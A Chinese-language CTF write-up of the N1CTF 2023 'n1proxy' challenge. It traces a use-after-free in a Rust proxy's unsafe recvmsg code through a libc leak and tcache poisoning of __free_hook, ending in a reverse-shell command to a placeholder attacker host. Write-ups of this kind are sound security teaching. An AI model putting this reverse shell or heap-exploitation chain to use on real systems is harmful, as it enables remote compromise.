# N1CTF 2023 n1proxy Writeup

## 题目简述

题目是用 Rust 编写的加密代理服务，支持 TCP、UDP 和 Unix Socket，连接前还有 RSA 签名与 AES-CBC 会话握手。真正的漏洞集中在接收函数 `my_recv_msg`：

```rust
let mut recv_iov = [iovec {
    iov_base: vec![0u8; recv_size].as_mut_ptr() as *mut _,
    iov_len: recv_size,
}];
recvmsg(fd, &mut msg, 0);
let res = slice::from_raw_parts(recv_iov[0].iov_base as *const u8, recv_size);
Ok(res.to_vec())
```

`vec![0; recv_size]` 是只在该完整表达式中存活的临时值。`as_mut_ptr()` 只取出裸指针，并不会延长 `Vec` 生命周期；`iovec` 初始化结束后临时 `Vec` 已释放，`recvmsg` 仍向该地址写入，随后代码又从同一悬空地址复制数据，形成稳定的堆 UAF。

## 解题过程

### 理清两类 Vec 分配的差异

服务运行在 Ubuntu 18.04、glibc 2.27，并通过 `mallopt(M_ARENA_MAX, 1)` 限制为单 arena。临时的 `vec![0; size]` 走零初始化分配，释放后进入对应 bin；末尾的 `slice.to_vec()` 则重新 `malloc` 并复制悬空区内容。配合两个代理端点和可控的 `recv_size`，可以让其他协议对象或 tcache 元数据占用这块内存，再由 UAF 读出或覆盖。

附件自带的 Rust 客户端已经完整实现握手，因此利用时不必重写 RSA/AES 协议。它先建立本地 Unix Socket 代理回环，发送少量数据并请求接收 `0x400` 字节，从返回缓冲区首个 qword 取得 libc 泄漏。对应题目环境的偏移为：

```rust
let libc_base = leak - 4111457;
let free_hook = libc_base + 0x3ed8e8;
let system = libc_base + 0x4f420;
```

### tcache 投毒覆盖 `__free_hook`

第二阶段选择服务其他路径尚未占用的 `0x60` 大小类。先通过已有代理连接把以下 32 字节写进即将被 UAF 使用的空闲块：

```text
__free_hook - 0x10
system
system
system
```

随后让服务端执行一次 `recv_data(fd, 0x60)`。临时 Vec 的释放与 `slice.to_vec()` 的再次分配会消费被篡改的 tcache 链，最终把 `system` 写到 `__free_hook`。这里的地址与大小均依赖题目所给 glibc 2.27，换到已移除 hooks 或启用 safe-linking 的新版 glibc 不能直接照搬。

### 用协议缓冲区触发 `system`

覆盖完成后，客户端反复新建连接，并把以下命令字节同时作为伪 RSA 公钥的模数和指数发送：

```bash
bash -c "bash -i >& /dev/tcp/ATTACKER/23333 0>&1"
```

服务端在解析失败或连接关闭时会释放承载这些字节的 Vec。此时 `free(command_buffer)` 被 `__free_hook` 改写为 `system(command_buffer)`，从而建立反向 shell。官方客户端采用循环触发，是为了抵消多线程连接与堆分配顺序带来的不稳定性。

## 方法总结

Rust 的内存安全保证不覆盖手写的 `unsafe` 生命周期假设。将临时 `Vec` 的裸指针塞进 C 结构后，所有权对象会立刻析构；之后的 `recvmsg` 与 `from_raw_parts` 都在访问已释放内存。题目再利用 `calloc`/`malloc` 路径差异、单 arena 和旧版 tcache，把 UAF 扩展为 libc 泄漏与 freelist 投毒，最终覆盖 `__free_hook`。审计 Rust FFI 时，应逐个确认裸指针背后的所有者是否至少活到最后一次 C 调用结束。
